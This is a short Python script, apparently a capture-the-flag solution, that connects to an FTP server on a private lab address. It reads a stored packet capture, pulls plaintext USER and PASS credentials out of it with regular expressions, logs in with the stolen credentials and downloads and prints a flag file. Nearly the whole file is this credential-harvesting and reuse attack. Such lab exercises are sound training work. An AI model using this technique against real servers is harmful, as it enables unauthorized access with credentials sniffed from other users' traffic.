#!/usr/bin/env python3

from ftplib import FTP
import os
import re

p = re.compile(b'fl\{.*?\}')
user_patt = re.compile(b'\x0dUSER (.+?)\x0d\x0a')
pass_patt = re.compile(b'\x0dPASS (.+?)\x0d\x0a')

for i in range(101,140):
  if i == 129:
    serverAdress = f"192.168.88.{i}"
    
    ftp = FTP(serverAdress)
    # ftp.login()

    # os.mkdir(f'tmp/{i}')

    # with open(f'tmp/{i}/capture.pcap', 'wb') as fp:
    #   ftp.retrbinary('RETR capture.pcap', fp.write)
    #   fp.close()

    #ftp.quit()
    f = open(f'tmp/{i}/capture.pcap', 'rb')

    data = f.read()

    username = user_patt.findall(data)[0]
    password = pass_patt.findall(data)[0]
    ftp.login(user=username.decode(), passwd=password.decode())

    ftp.retrbinary('RETR flag.txt', lambda flag: print(f"{i}: {flag}"))
    

    #print(f"{i}: {user_patt.findall(f.read())}")
  

